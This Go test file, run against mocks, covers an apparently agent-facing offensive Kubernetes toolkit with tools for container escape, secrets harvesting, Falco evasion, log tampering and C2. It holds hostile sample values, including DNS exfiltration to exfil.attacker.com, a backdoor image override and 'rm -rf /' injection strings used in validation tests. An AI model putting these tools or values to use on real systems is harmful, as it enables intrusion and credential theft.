package kubedagger

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// allTools returns every tool in the kubedagger package instantiated with
// the given executor. This is the single source of truth for enumerating tools.
func allTools(exec executor.Executor) []mcp.Tool {
	return []mcp.Tool{
		NewNetworkScan(exec),
		NewNetworkDiscovery(exec),
		NewDockerList(exec),
		NewDockerOverride(exec),
		NewK8sDiscover(exec),
		NewK8sAbuse(exec),
		NewContainerEscape(exec),
		NewSecretsHarvest(exec),
		NewCloudMeta(exec),
		NewCloudExfil(exec),
		NewEvasion(exec),
		NewNetBypass(exec),
		NewMeshBypass(exec),
		NewObsPoison(exec),
		NewDNSExfil(exec),
		NewCovertChannel(exec),
		NewWebhook(exec),
		NewDaemonset(exec),
		NewKeyring(exec),
		NewTLSIntercept(exec),
		NewEtcdSteal(exec),
		NewLogTamper(exec),
		NewSyscallBypass(exec),
		NewAuditFilter(exec),
		NewPcapBlind(exec),
		NewPolymorph(exec),
		NewFilelessExec(exec),
		NewXDPShell(exec),
		NewARPSpoof(exec),
		NewKubelet(exec),
		NewVethHijack(exec),
		NewSidecarInject(exec),
		NewSupplyChain(exec),
		NewCRITamper(exec),
		NewSAToken(exec),
		NewPodIdentity(exec),
		NewGitOpsPoison(exec),
		NewCRDBackdoor(exec),
		NewHoneypotDetect(exec),
		NewK8sEventC2(exec),
		NewContainerLogC2(exec),
		NewDoHC2(exec),
		NewTCPStego(exec),
		NewBPFIPC(exec),
		NewSchedStarve(exec),
		NewFaultInject(exec),
		NewCgroupManip(exec),
		NewElectionDisrupt(exec),
		NewCertSabotage(exec),
		NewKeyringMITM(exec),
		NewCoredumpSuppress(exec),
		NewTimeskew(exec),
		NewSigBypass(exec),
		NewOperatorAgents(exec),
		NewOperatorShell(exec),
		NewOperatorModule(exec),
		NewOperatorTasks(exec),
	}
}

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

// ---------------------------------------------------------------------------
// Test: All tools have non-empty Name() and Description()
// ---------------------------------------------------------------------------

func TestAllTools_NameAndDescription(t *testing.T) {
	mock := executor.NewMock()
	tools := allTools(mock)

	if len(tools) == 0 {
		t.Fatal("allTools returned zero tools")
	}

	seen := make(map[string]bool)
	for _, tool := range tools {
		name := tool.Name()
		desc := tool.Description()

		if name == "" {
			t.Errorf("tool has empty Name()")
			continue
		}
		if desc == "" {
			t.Errorf("tool %q has empty Description()", name)
		}
		if len(desc) < 10 {
			t.Errorf("tool %q Description() is suspiciously short: %q", name, desc)
		}
		if seen[name] {
			t.Errorf("duplicate tool name: %q", name)
		}
		seen[name] = true
	}

	t.Logf("validated %d tools for Name/Description", len(tools))
}

// ---------------------------------------------------------------------------
// Test: All tools return valid JSON from InputSchema()
// ---------------------------------------------------------------------------

func TestAllTools_InputSchemaValid(t *testing.T) {
	mock := executor.NewMock()
	tools := allTools(mock)

	for _, tool := range tools {
		name := tool.Name()
		schema := tool.InputSchema()

		if len(schema) == 0 {
			t.Errorf("tool %q: InputSchema() returned empty", name)
			continue
		}

		var parsed map[string]any
		if err := json.Unmarshal(schema, &parsed); err != nil {
			t.Errorf("tool %q: InputSchema() is invalid JSON: %v", name, err)
			continue
		}

		// Every schema should declare "type": "object"
		if tp, ok := parsed["type"]; !ok || tp != "object" {
			t.Errorf("tool %q: InputSchema() missing \"type\": \"object\"", name)
		}
	}
}

// ---------------------------------------------------------------------------
// Test: Execute with valid params and mock executor (representative sample)
// ---------------------------------------------------------------------------

func TestNetworkScan_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("10.0.0.1:80 OPEN\n10.0.0.1:443 OPEN\n")
	}
	tool := NewNetworkScan(mock)

	params := mustJSON(map[string]any{
		"target":    "10.0.0.0/24",
		"interface": "eth0",
		"port":      80,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "10.0.0.1:80 OPEN") {
		t.Errorf("expected scan output in result, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	if call.Binary != "kubedagger-client" {
		t.Errorf("expected binary kubedagger-client, got %q", call.Binary)
	}
	assertArgs(t, call.Args, "--target", "10.0.0.0/24")
	assertArgs(t, call.Args, "--interface", "eth0")
	assertArgs(t, call.Args, "--port", "80")
}

func TestDockerList_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("CONTAINER ID  IMAGE        STATUS\nabc123       nginx:latest Running\n")
	}
	tool := NewDockerList(mock)

	params := mustJSON(map[string]any{
		"namespace": "default",
		"all":       true,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "nginx:latest") {
		t.Errorf("expected container listing in result, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertArgs(t, call.Args, "--namespace", "default")
	assertContains(t, call.Args, "--all")
}

func TestK8sDiscover_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("NAME          READY  STATUS\nnginx-pod-1   1/1    Running\n")
	}
	tool := NewK8sDiscover(mock)

	params := mustJSON(map[string]any{
		"namespace":      "kube-system",
		"resource":       "pods",
		"all_namespaces": false,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "nginx-pod-1") {
		t.Errorf("expected pod listing in result, got: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Namespace: kube-system") {
		t.Errorf("expected namespace header in result, got: %s", result.Content[0].Text)
	}
}

func TestContainerEscape_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("[+] Privileged mode detected\n[+] Docker socket found at /var/run/docker.sock\n")
	}
	tool := NewContainerEscape(mock)

	params := mustJSON(map[string]any{
		"action": "detect",
		"method": "auto",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Privileged mode detected") {
		t.Errorf("expected escape detection output, got: %s", result.Content[0].Text)
	}
}

func TestDNSExfil_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("Sent 5 chunks via DNS queries\nExfiltration complete.\n")
	}
	tool := NewDNSExfil(mock)

	params := mustJSON(map[string]any{
		"domain":     "exfil.attacker.com",
		"data":       "sensitive-data-here",
		"encoding":   "base32",
		"chunk_size": 50,
		"delay":      100,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "5 chunks") {
		t.Errorf("expected exfil output, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertArgs(t, call.Args, "--domain", "exfil.attacker.com")
	assertArgs(t, call.Args, "--data", "sensitive-data-here")
	assertArgs(t, call.Args, "--encoding", "base32")
}

func TestCloudMeta_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte(`{"AccessKeyId":"AKIAIOSFODNN7EXAMPLE","SecretAccessKey":"wJalrXUtnFEMI"}`)
	}
	tool := NewCloudMeta(mock)

	params := mustJSON(map[string]any{
		"provider": "aws",
		"token":    true,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "AKIAIOSFODNN7EXAMPLE") {
		t.Errorf("expected AWS credentials in output, got: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Provider: aws") {
		t.Errorf("expected provider header, got: %s", result.Content[0].Text)
	}
}

func TestSecretsHarvest_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("SECRET: default/db-credentials  type=Opaque  keys=[password, username]\n")
	}
	tool := NewSecretsHarvest(mock)

	params := mustJSON(map[string]any{
		"namespace": "default",
		"source":    "all",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "db-credentials") {
		t.Errorf("expected secrets output, got: %s", result.Content[0].Text)
	}
}

func TestDockerOverride_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("Override applied successfully to container abc123\n")
	}
	tool := NewDockerOverride(mock)

	params := mustJSON(map[string]any{
		"container_id": "abc123def456",
		"image":        "attacker/backdoor:latest",
		"entrypoint":   "/bin/sh",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Override applied") {
		t.Errorf("expected override confirmation, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertArgs(t, call.Args, "--id", "abc123def456")
	assertArgs(t, call.Args, "--image", "attacker/backdoor:latest")
	assertArgs(t, call.Args, "--entrypoint", "/bin/sh")
}

// ---------------------------------------------------------------------------
// Test: Execute with executor error
// ---------------------------------------------------------------------------

func TestNetworkScan_ExecuteError(t *testing.T) {
	mock := executor.NewMock()
	mock.StderrFn = func(_ string, _ []string) []byte {
		return []byte("connection refused")
	}
	mock.ErrFn = func(_ string, _ []string) error {
		return &mockError{"execution timed out"}
	}
	tool := NewNetworkScan(mock)

	params := mustJSON(map[string]any{"target": "10.0.0.0/24"})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute should not return Go error, got: %v", err)
	}
	if !result.IsError {
		t.Fatal("expected IsError=true when executor fails")
	}
	if !strings.Contains(result.Content[0].Text, "timed out") {
		t.Errorf("expected timeout message in error, got: %s", result.Content[0].Text)
	}
}

// ---------------------------------------------------------------------------
// Test: Shell metacharacter injection is rejected
// ---------------------------------------------------------------------------

func TestShellMetacharRejection(t *testing.T) {
	// Each forbidden char from validate.go's shellMetachars slice
	forbiddenChars := []string{";", "|", "&", "`", "$", "(", ")", "{", "}", "<", ">", "!", "'", "\"", "\\", "\n", "\r"}

	tests := []struct {
		name   string
		tool   mcp.Tool
		params func(injection string) json.RawMessage
	}{
		{
			name: "NetworkScan_target",
			tool: NewNetworkScan(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"target": "10.0.0.1" + inj + "rm -rf /"})
			},
		},
		{
			name: "NetworkScan_interface",
			tool: NewNetworkScan(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"target": "10.0.0.1", "interface": "eth0" + inj + "bad"})
			},
		},
		{
			name: "DockerOverride_container_id",
			tool: NewDockerOverride(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"container_id": "abc" + inj + "evil"})
			},
		},
		{
			name: "DockerOverride_image",
			tool: NewDockerOverride(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"container_id": "abc123", "image": "img" + inj + "bad"})
			},
		},
		{
			name: "DockerOverride_entrypoint",
			tool: NewDockerOverride(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"container_id": "abc123", "entrypoint": "/bin/sh" + inj + "evil"})
			},
		},
		{
			name: "ContainerEscape_target",
			tool: NewContainerEscape(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"action": "detect", "target": "victim" + inj + "cmd"})
			},
		},
		{
			name: "ContainerEscape_command",
			tool: NewContainerEscape(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"action": "execute", "command": "id" + inj + "rm -rf /"})
			},
		},
		{
			name: "DNSExfil_domain",
			tool: NewDNSExfil(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"domain": "evil.com" + inj + "x"})
			},
		},
		{
			name: "DNSExfil_data",
			tool: NewDNSExfil(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"domain": "exfil.com", "data": "payload" + inj + "cmd"})
			},
		},
		{
			name: "DNSExfil_source",
			tool: NewDNSExfil(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"domain": "exfil.com", "source": "/etc/passwd" + inj + "x"})
			},
		},
		{
			name: "CloudMeta_endpoint",
			tool: NewCloudMeta(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"endpoint": "http://169.254.169.254" + inj + "x"})
			},
		},
	}

	for _, tc := range tests {
		for _, char := range forbiddenChars {
			testName := tc.name + "_char_" + charLabel(char)
			t.Run(testName, func(t *testing.T) {
				params := tc.params(char)
				result, err := tc.tool.Execute(context.Background(), params)
				if err != nil {
					t.Fatalf("Execute returned Go error: %v", err)
				}
				if !result.IsError {
					t.Errorf("expected rejection for char %q, but got success", char)
					return
				}
				if !strings.Contains(result.Content[0].Text, "forbidden character") {
					t.Errorf("expected 'forbidden character' in error message, got: %s", result.Content[0].Text)
				}
			})
		}
	}
}

// ---------------------------------------------------------------------------
// Test: Namespace validation rejects invalid namespaces
// ---------------------------------------------------------------------------

func TestNamespaceValidation(t *testing.T) {
	tests := []struct {
		name      string
		namespace string
		wantErr   bool
	}{
		{"valid_simple", "default", false},
		{"valid_with_dash", "kube-system", false},
		{"valid_numbers", "ns123", false},
		{"invalid_uppercase", "Default", true},
		{"invalid_underscore", "my_namespace", true},
		{"invalid_dot", "my.namespace", true},
		{"invalid_starts_with_dash", "-invalid", true},
		{"invalid_too_long", strings.Repeat("a", 64), true},
		{"invalid_shell_injection", "default;rm -rf /", true},
		{"empty_is_ok", "", false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mock := executor.NewMock()
			mock.StdoutFn = func(_ string, _ []string) []byte {
				return []byte("ok")
			}
			tool := NewDockerList(mock)

			params := mustJSON(map[string]any{"namespace": tc.namespace})
			result, err := tool.Execute(context.Background(), params)
			if err != nil {
				t.Fatalf("Execute returned Go error: %v", err)
			}

			if tc.wantErr && !result.IsError {
				t.Errorf("expected validation error for namespace %q, got success", tc.namespace)
			}
			if !tc.wantErr && result.IsError {
				t.Errorf("expected success for namespace %q, got error: %s", tc.namespace, result.Content[0].Text)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Test: K8sDiscover namespace validation
// ---------------------------------------------------------------------------

func TestK8sDiscover_InvalidNamespace(t *testing.T) {
	mock := executor.NewMock()
	tool := NewK8sDiscover(mock)

	params := mustJSON(map[string]any{
		"namespace": "INVALID_NS",
		"resource":  "pods",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !result.IsError {
		t.Error("expected validation error for uppercase namespace")
	}
}

// ---------------------------------------------------------------------------
// Test: Empty/missing required params return errors
// ---------------------------------------------------------------------------

func TestContainerEscape_MissingAction(t *testing.T) {
	mock := executor.NewMock()
	tool := NewContainerEscape(mock)

	// action is required by schema but let's test with invalid JSON structure
	result, err := tool.Execute(context.Background(), json.RawMessage(`{invalid`))
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !result.IsError {
		t.Error("expected error for invalid JSON")
	}
	if !strings.Contains(result.Content[0].Text, "invalid input") {
		t.Errorf("expected 'invalid input' message, got: %s", result.Content[0].Text)
	}
}

func TestDNSExfil_InvalidJSON(t *testing.T) {
	mock := executor.NewMock()
	tool := NewDNSExfil(mock)

	result, err := tool.Execute(context.Background(), json.RawMessage(`not json at all`))
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !result.IsError {
		t.Error("expected error for malformed JSON")
	}
}

// ---------------------------------------------------------------------------
// Test: Evasion tool with valid params
// ---------------------------------------------------------------------------

func TestEvasion_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("[+] Falco eBPF hooks suppressed\n[+] Event filter installed\n")
	}
	tool := NewEvasion(mock)

	params := mustJSON(map[string]any{
		"target": "falco",
		"mode":   "suppress",
		"pid":    1234,
		"scope":  "process",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Falco eBPF hooks suppressed") {
		t.Errorf("expected evasion output, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertArgs(t, call.Args, "--target", "falco")
	assertArgs(t, call.Args, "--mode", "suppress")
	assertArgs(t, call.Args, "--pid", "1234")
	assertArgs(t, call.Args, "--scope", "process")
}

// ---------------------------------------------------------------------------
// Test: NetworkDiscovery with valid params
// ---------------------------------------------------------------------------

func TestNetworkDiscovery_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("10.0.0.5 -> 10.0.0.10:8080 (TCP)\n10.0.0.5 -> 10.0.0.20:443 (TCP)\n")
	}
	tool := NewNetworkDiscovery(mock)

	params := mustJSON(map[string]any{
		"target":    "10.0.0.0/24",
		"mode":      "passive",
		"passive":   true,
		"duration":  30,
		"interface": "eth0",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "10.0.0.5 -> 10.0.0.10:8080") {
		t.Errorf("expected discovery output, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertArgs(t, call.Args, "--target", "10.0.0.0/24")
	assertArgs(t, call.Args, "--mode", "passive")
	assertContains(t, call.Args, "--passive")
	assertArgs(t, call.Args, "--duration", "30")
	assertArgs(t, call.Args, "--interface", "eth0")
}

// ---------------------------------------------------------------------------
// Test: Empty output produces informative result (not error)
// ---------------------------------------------------------------------------

func TestNetworkScan_EmptyOutput(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("")
	}
	tool := NewNetworkScan(mock)

	params := mustJSON(map[string]any{"target": "10.0.0.0/24"})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatal("empty output should not be an error")
	}
	if !strings.Contains(result.Content[0].Text, "No results") {
		t.Errorf("expected 'No results' message, got: %s", result.Content[0].Text)
	}
}

// ---------------------------------------------------------------------------
// Test: validateSafeString with oversized input
// ---------------------------------------------------------------------------

func TestValidateSafeString_TooLong(t *testing.T) {
	longInput := strings.Repeat("a", 4097)
	mock := executor.NewMock()
	tool := NewNetworkScan(mock)

	params := mustJSON(map[string]any{"target": longInput})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !result.IsError {
		t.Error("expected rejection for input exceeding 4096 chars")
	}
	if !strings.Contains(result.Content[0].Text, "too long") {
		t.Errorf("expected 'too long' message, got: %s", result.Content[0].Text)
	}
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

type mockError struct {
	msg string
}

func (e *mockError) Error() string { return e.msg }

func assertArgs(t *testing.T, args []string, flag, value string) {
	t.Helper()
	for i, a := range args {
		if a == flag && i+1 < len(args) && args[i+1] == value {
			return
		}
	}
	t.Errorf("expected args to contain %q %q, got %v", flag, value, args)
}

func assertContains(t *testing.T, args []string, flag string) {
	t.Helper()
	for _, a := range args {
		if a == flag {
			return
		}
	}
	t.Errorf("expected args to contain %q, got %v", flag, args)
}

// charLabel returns a readable label for metacharacters used in test names.
func charLabel(c string) string {
	labels := map[string]string{
		";":  "semicolon",
		"|":  "pipe",
		"&":  "ampersand",
		"`":  "backtick",
		"$":  "dollar",
		"(":  "lparen",
		")":  "rparen",
		"{":  "lbrace",
		"}":  "rbrace",
		"<":  "lt",
		">":  "gt",
		"!":  "bang",
		"'":  "squote",
		"\"": "dquote",
		"\\": "backslash",
		"\n": "newline",
		"\r": "carriage_return",
	}
	if l, ok := labels[c]; ok {
		return l
	}
	return c
}
